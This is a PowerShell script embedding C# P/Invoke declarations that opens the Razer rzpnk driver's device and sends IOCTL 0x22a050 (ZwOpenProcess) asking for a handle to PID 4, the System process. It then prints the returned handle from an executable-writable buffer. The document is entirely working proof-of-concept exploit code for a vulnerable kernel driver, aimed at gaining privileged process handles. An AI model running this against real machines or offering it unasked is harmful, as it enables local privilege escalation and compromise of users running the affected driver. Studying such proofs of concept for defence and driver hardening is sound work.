Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
   
public static class Razer
{
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr CreateFile(
        String lpFileName,
        UInt32 dwDesiredAccess,
        UInt32 dwShareMode,
        IntPtr lpSecurityAttributes,
        UInt32 dwCreationDisposition,
        UInt32 dwFlagsAndAttributes,
        IntPtr hTemplateFile);
   
    [DllImport("Kernel32.dll", SetLastError = true)]
    public static extern bool DeviceIoControl(
        IntPtr hDevice,
        int IoControlCode,
        byte[] InBuffer,
        int nInBufferSize,
        IntPtr OutBuffer,
        int nOutBufferSize,
        ref int pBytesReturned,
        IntPtr Overlapped);
 
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        uint dwSize,
        UInt32 flAllocationType,
        UInt32 flProtect);
}
"@
 
#----------------[Get Driver Handle]
 
$hDevice = [Razer]::CreateFile("\\.\47CD78C9-64C3-47C2-B80F-677B887CF095", [System.IO.FileAccess]::ReadWrite,
[System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)
 
if ($hDevice -eq -1) {
    echo "`n[!] Unable to get driver handle..`n"
    Return
} else {
    echo "`n[>] Driver access OK.."
    echo "[+] lpFileName: \\.\47CD78C9-64C3-47C2-B80F-677B887CF095 => rzpnk"
    echo "[+] Handle: $hDevice"
}
 
#----------------[Prepare buffer & Send IOCTL]
 
# Input buffer
$InBuffer = @(
    [System.BitConverter]::GetBytes([Int64]0x4) + # PID 4 = System = 0x0000000000000004
    [System.BitConverter]::GetBytes([Int64]0x0)   # 0x0000000000000000
)
 
# Output buffer 1kb
$OutBuffer = [Razer]::VirtualAlloc([System.IntPtr]::Zero, 1024, 0x3000, 0x40)
 
# Ptr receiving output byte count
$IntRet = 0
 
#=======
# 0x22a050 - ZwOpenProcess
#=======
$CallResult = [Razer]::DeviceIoControl($hDevice, 0x22a050, $InBuffer, $InBuffer.Length, $OutBuffer, 1024, [ref]$IntRet, [System.IntPtr]::Zero)
if (!$CallResult) {
    echo "`n[!] DeviceIoControl failed..`n"
    Return
}
 
#----------------[Read out the result buffer]
echo "`n[>] Call result:"
"{0:X}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($OutBuffer.ToInt64()))
"{0:X}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($OutBuffer.ToInt64()+8))